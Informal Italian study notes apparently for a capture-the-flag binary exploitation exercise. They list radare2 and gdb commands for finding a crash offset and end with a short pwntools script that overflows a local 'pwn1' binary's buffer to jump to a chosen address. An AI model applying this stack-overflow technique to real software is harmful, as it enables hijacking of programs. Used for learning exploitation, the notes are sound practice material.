radare2 .\nome_file

aaa

afl

iz	[VEDI LISTA OBA CHE FA]
ie	[VEDI ENTY POINT]
iM	[VEDI MAIN]

pdf @nome_funzione   o   s nome_funzione 	[MOSTA nome_funzione]
			 pdf	

V 	[VISUAL APPESENTATION OF THE BINAY]


_____________________________

checksec 
______________________________

Se trovi segmentation fault: (fgets, in quanto funzione vecchi)
______________________________

un volta che si che è seg. fault:

gdb -q .\file_name

pattern crete 100000 

run

*paste di quello che ti dà il pattern*

Guarda I REGISTRI [RBP] e [RSP] che in questo caso sono quelli con là nostra stinga
Guarda L'INDIRIZZO CONTENUTO NEL REGISTRO [RIP] e Ricordalo per dopo

copia i primi 3 char di ogni Registro e fai:

pattern search ***        [*** sono i 3 char]

calcola l'offset di entrambi (il secondo Registro è il più accurato) e Ricordatelo
___________________________________________

Crea UN FILE exploit.py

from pwn import *

p = process('./pwn1')
garbage = 'a' * 140    #OFFSET
target_address = 0x080484ad  #CAMBIALO
address = p32(target_address)
msgin = garbage.encode('ascii') + address
p.sendline(msgin)
p.interactive()



